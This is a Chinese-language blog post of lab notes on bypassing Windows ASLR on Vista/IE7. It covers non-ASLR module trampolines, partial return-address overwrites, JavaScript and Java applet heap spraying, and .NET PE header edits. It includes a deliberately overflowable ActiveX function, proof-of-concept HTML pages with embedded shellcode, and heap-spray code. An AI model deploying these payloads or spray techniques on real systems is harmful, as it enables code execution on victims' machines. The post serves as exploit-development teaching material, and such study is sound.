---
title: 攻击ASLR的方法
date: 2017-07-14 17:31:06
categories: 安全技术
tags: [windows, ASLR]
---

攻击ASLR的方式很多，这里主要讲攻击未启用ASLR的模块、利用部分覆盖进行定位内存地址、利用Heap Spray技术定位内存地址、利用java applet heap spray技术定位内存地址、为.NET控件禁用ASLR

### 1. 攻击未启用ASLR的模块

ASLR仅仅只是安全机制，不是行业标准，不支持ASLR的软件很多，它们的加载基址固定，如果能够在当前控件中找到这样的模块，就可以利用它里面的指令作跳板，无视ASLR。Adobe Player ActiveX9就不支持ASLR。

我们可以使用下面的方式测试：
1. 具有溢出漏洞的ActiveX控件
2. 不启用ASLR的Flash9e.ocx
3. 可以触发ActiveX控件溢出漏洞的POC页面

#### 1.1 ActiveX、POC代码

<pre><code>
void CVulnerAXCtrl::test(LPCTSTR str)
{
	// AFX_MANAGE_STATE(AfxGetStaticModuleState());
	// TODO: Add your dispatch handler code here
    printf("aaaa");
    char dest[100];
    sprintf(dest, "%s", str);
}
</code></pre>

<font color=#f00>这里面有一个巨大的坑点，就是在vista上安装好了adobe player activex 9之后，需要重启，否则在IE上打不开map.swf文件</font>

POC.html
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,115,0" width="160" height="260"&gt;  
&lt;param name="movie" value="map.swf" /&gt;  
&lt;param name="quality" value="high" /&gt;  
&lt;embed src="map.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"&gt;&lt;/embed&gt;
&lt;/object&gt; 
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 54) {
    s += "\u9090";
}
s += "\uEC2F\u3015\u9090\u9090";
s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

#### 1.2 实验内容

<b>实验内容</b>
1. 为了直观反映ASLR，本次不是用ActiveX控件不使用GS
2. 通过WEB页面同时加载具有溢出漏洞的ActiveX和Flash9e.ocx
3. 又有IE7和DEP是关闭的，所以不用考虑DEP影响
4. 函数test存在典型的溢出
5. Flash9k.ocx未启用ASLR，所以其加载地址是固定的，只需要在其内部寻找合适的跳板指令来跳转到shellcode

<b>实验环境</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows Vista SP0| |
|DEP状态|Optin|Vista默认状态|
|浏览器|IE7||
|Flash Player版本|9.0.115||

经过某次测试，得到溢出字符串的起始地址0x0337F4B4
返回地址所在栈中地址：0x0337F520。所以覆盖返回地址需要填充108个0x90，也即54个\u9090

书上的解释：
我们使用0x1014D286处的MOV EAX,EDX RETN 8来调整EAX，而作为机器码时，其代表：
86D2	XCHG DL,DL
1410 	ADC AL, 10
可以看出其不会对正常的程序有影响。
接下来用4字节的0x90填充消除test函数返回时的4字节偏移。
接着是用0x1012E78A来(JMP ESI)跳转至shellcode
跟着是0x90填充

实验测试：
0x3015EC2F: jmp esp

<font color=#f00>POC中的第一个classid的值一般不变，对应的cab应该与安装的flash版本一致。
第一个object的作用是提前加载swf文件，这样在调试的时候就能看到Flash9e.ocx内容</font>

### 2. 利用部分覆盖进行定位内存地址

映像随机化只会对映像加载基址的前2个字节做随机化处理。

#### 2.1 实验代码

<pre><code>
#include "stdafx.h"
#include "stdlib.h"

char shellcode[] = 
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x00\x30";

char* test()
{
	char tt[256];
	//__asm int 3
	memcpy(tt, shellcode, 262);
	return tt;
}

int _tmain(int argc, _TCHAR* argv[])
{
	char temp[200];
	test();
	return 0;
}
</code></pre>

#### 2.2 实验内容

<b>实验思路</b>
1. 不启用GS
2. 禁用DEP
3. test存在典型的溢出漏洞
4. 复制结束后，test函数返回tt字符数组的首地址
5. 在相对程序加载基址0x0000~0xFFFF的范围内，找到一条跳板指令，并用它地址的后两个字节覆盖返回地址的后两个字节
6. 采用这种“相对寻址”的方法来动态确定跳板指令的地址，以实现跳板指令的通用性

<b>实验环境</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows Vista SP0| |
|DEP状态|Optin|Vista默认状态|
|编辑器|Visual Studio 2008||
|优化选项|禁用优化选项||
|GS选项|GS关闭||
|DEP选项|/NXCOMPAT:NO||
|build版本|release||

溢出字符串起始地址：0x0016F64C
返回地址在栈中地址：0x0016F750

memcpy之后，复制的地址可能不知道，但是复制到哪儿，却是很清楚！


### 3. 利用Heap Spray技术定位内存地址

#### 3.1 实验代码

POC代码
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;script&gt;
var nops = unescape("%u9090%u9090");
var shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
while (nops.length &lt;0x100000/2)
    nops += nops;
nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length);
nops = nops+shellcode;
var memory = new Array();
for (var i=0; i&lt;200; i++)
    memory[i] += nops;
&lt;/script&gt;
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 54){
    s += "\u9090";
}
s += "\u0C0C\u0C0C";
test.test(s)
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

#### 3.2 实验内容

利用JS申请200个1MB的内存块，观察内存块的起始地址的变化情况。为了便于确定内存块的起始位置，我们在内存块的开始位置放置0x81828182，然后查找来确定内存块的起始位置！

由于Heap Spray是针对浏览器的，所以这儿仍然使用ActiveX来进行演示！为了测试，一般将EIP指向0x0C0C0C0C这个位置！！

<b>实验思路</b>
1. 利用Heap Spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理
2. 每个内存块中包含着0x90填充和shellcode
3. Heap Spray结束后我们会占领0x0C0C0C0C附近的内存，我们只需要控制程序转入0x0C0C0C0C执行，在执行若干个0x90滑行之后就可以到达shellcode范围并执行
4. test函数存在典型的溢出漏洞，此处用的VulnerAX.ocx中的ActiveX控件
5. 我们将函数返回地址覆盖为0x0C0C0C0C，函数执行返回执行后就会转入我们申请的内存空间中

### 4. 利用java applet heap spray技术定位内存地址

<font color=#f00>Java applet能绕过DEP，是因为JVM分配Java applet申请的空间时将其申请的空间打上了PAGE_EXECUTE_READWRITE标识，让这段内存具有可执行属性!
其实在java applet中可以采用类似Heap spray的方法，在JVM的堆空间中申请大量的内存块来对抗ASLR！
与Heap Spray不同的是，Heap Spray最大可申请1GB的空间，而每个Java applet最多能申请100MB的空间。为此我们申请90MB空间！！
</font>

#### 4.1 实验代码

AppletSpray.java
<pre><code>
import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
    public void init(){
        String shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
        String[] mem = new String[1024];
        StringBuffer buffer = new StringBuffer(0x100000/2);
        // header (12 bytes)  nop (0x10000-32-2-x) shellcode(x)  NULL(2)
        for(int i=0;i<(0x100000-12-2)/2-shellcode.length();i++)
            buffer.append("\u9090");
        buffer.append(shellcode);
        Runtime.getRuntime().gc();
        for(int j=0;j<90;j++)
            mem[j] += buffer.toString();
    }
}
</code></pre>

POC.html
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;applet code=AppletSpray.class width=300 height=50&gt;&lt;/applet&gt;
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while(s.length &lt; 54){
    s += "\u9090";
}
s += "\u0A0A\u110A";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

#### 4.2 实验内容

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows Vista SP0||
|DEP状态|Optin|该选项任意，因为这种方法可以绕过DEP|
|浏览器|IE7||
|Java JDK|1.4.2|1.5以前的均可|
|目标版本|1.1|脱离JRE，在不具有JRE机器上也能执行|
|JRE|不使用JRE||
|Applet编译指令|javac 路径\Shellcode.java -target 1.1|

<b>Java Applet申请空间测试代码</b>
<pre><code>
import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
    public void init(){
        String[] mem = new String[1024];
        StringBuffer buffer = new StringBuffer(0x100000/2);
        buffer.append("\u8281\u8182");
        for(int i=0;i<(0x100000-16)/2;i++)
            buffer.append("\u9090");
        Runtime.getRuntime().gc();
        for(int j=0;j<90;j++)
            mem[j] += buffer.toString();
    }
}
</code></pre>

<b>Java Applet申请空间起始地址测试结果</b>

|重启前|内存起始地址|重启后|内存起始地址范围|
|--|--|--|--|
|1|0x10010014-0x13F5FDE4|1|0x10010014-0x13F4CC10|
|2|0x10010014-0x13F4CC10|2|0x10010014-0x13F5A3E8|

从表中可以看出4次试验均有一定的交集，这说明90MB的空间基本上可以对抗ASLR了。不妨使用0x110A0A0A作为切入点，只要将攻击函数的返回地址覆盖为0x110A0A0A，经过若干个0x90的滑行就可以执行shellcode了

### 5. 为.NET控件禁用ASLR

#### 5.1 原理解读

当.NET控件的IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识移除后，这个.NET控件依然会随机加载。

ASLR对PE文件是否启用随机化处理的校验过程：
<pre><code>
if(!(pBinaryInfo->pHeaderInfo->usDllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE) && 
!(pBinaryInfo->pHeaderInfo->bFlags & PINFO_IL_ONLY_IMAGES) &&
!(_MmMoveImages == -1))
{
	_MiNoRelocate++;
    return 0;
}
</code></pre>

从代码中可以看出，只要满足下列任意条件就会对PE文件进行随机化处理
1. PE头含有IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识
2. IL-Only文件，这是对.NET文件进行了特殊照顾
3. _MmMoveImages 值为-1

由上可以若一个文件是IL-Only文件，无论是否设置了IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，都会随机化加载。而加载到浏览器中的.NET控件恰恰是IL-Only的。

系统验证.NET是否是IL-Only文件过程
<pre><code>
if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && pCORHeader->MinorRuntimeVersion>=5)) &&
(pCORHeader->Flags & COMIMAGE_FLAGS_ILONLY))
{
	pImageControlArea->pBinaryInfo->pHeaderInfo->bFlags != PINFO_IL_ONLY_IMAGE;
    ……
}
</code></pre>

通过分析代码，可以发现当系统在检查一个.NET文件是否具有COMIMAGE_FLAGS_ILONLY标识前分别对.NET文件运行时版本号进行判断，如果版本号低于2.5则不运行COMIMAGE_FLAGS_ILONLY标识校验，这个文件就不会被认定为IL-Only！

如果.NET文件被指定加载基址，而其不包含IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，又不被认定为IL-Only，就可以不被ASLR

#### 5.2 实验工具

我们可以使用CFF Explorer软件来修改.NET控件的PE头<font color=#0f0>[该软件在吾爱破解工具包中有]</font>

首先去掉文件IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，用CFF Explorer打开DEP_NETDLL.dll后，点击Optional header->DllCharacteristics进行设置
![去掉IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识](/images/2017-07-14/remove_dll_characteristics.jpg)

然后设置.NET控件的运行版本号，修改至小于2.5即可。在.NET Directory选项页中设置，修改完之后保存即可

#### 5.3 实验测试

本实验测试沿用[利用.NET绕过DEP](/2017/07/12/攻击DEP的方法-下/)，不过不同的是本次实验是在Vista上完成的


